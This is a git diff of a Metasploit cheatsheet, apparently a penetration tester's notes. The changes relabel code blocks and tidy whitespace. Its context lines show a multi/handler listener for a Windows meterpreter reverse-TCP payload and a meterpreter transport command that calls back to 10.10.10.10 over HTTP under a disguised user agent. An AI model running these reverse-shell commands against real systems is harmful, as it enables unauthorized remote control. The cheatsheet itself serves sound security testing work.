@@ -34,7 +34,7 @@ Post | Post-Exploitation phase
 ## Simple and useful
 
 Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
-```msfconsole
+```ruby
 use multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST $LISTENING-IP
@@ -51,7 +51,7 @@ Web Delivery [[Crackmapexec-Cheatsheet]] smb Module `met_inject`
 
 ## Commands
 
-```msfconsole
+```ruby
 background		# background a session
 				# OR CTRL+Z
 check			# check if system is vulnerable(SOME MODULES HAVE THIS)
@@ -127,7 +127,8 @@ Database Backend Commands
 
 Workspace according to [Rapid7](https://docs.rapid7.com/metasploit/managing-workspaces/): *"Workspaces enable you to segment and manage the hosts and data stored in the database. You can use workspaces to create a logical separation for each segment that you want to test. For example, you may want to create a workspace for each subnet within an organization to limit the hosts to a specific network. Departments like HR, IT, and Accounting would each have its own workspace."*
 
-```bash
+
+```ruby
 workspace -h
 Usage:
     workspace                  List workspaces
@@ -143,14 +144,13 @@ Usage:
 
 ## Auxiliary Modules Commands
 
-```msfconsole
+```ruby
 show auxiliary # see all auxiliary modules
 ```
 
 ## Exploit Module Commands
 
-```msfconsole
-
+```ruby
 show payloads 	# Check compatable payloads - VERY important
 set payload 	# Assign payload choice to exploit
 check			# Some exploit check if the provided <options> RHOST is vulnerable
@@ -183,7 +183,6 @@ Transports are the answer to making meterpreter connect over various protocols, 
 transport list # to list 
 transport add -t reverse_http -l 10.10.10.10 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
 # -l lhost; -p lport, -T retry total, -W retry wait, -C communication timeout, -A custom user agent 
-
 ```
 
 ## Metasploit Post Exploitation
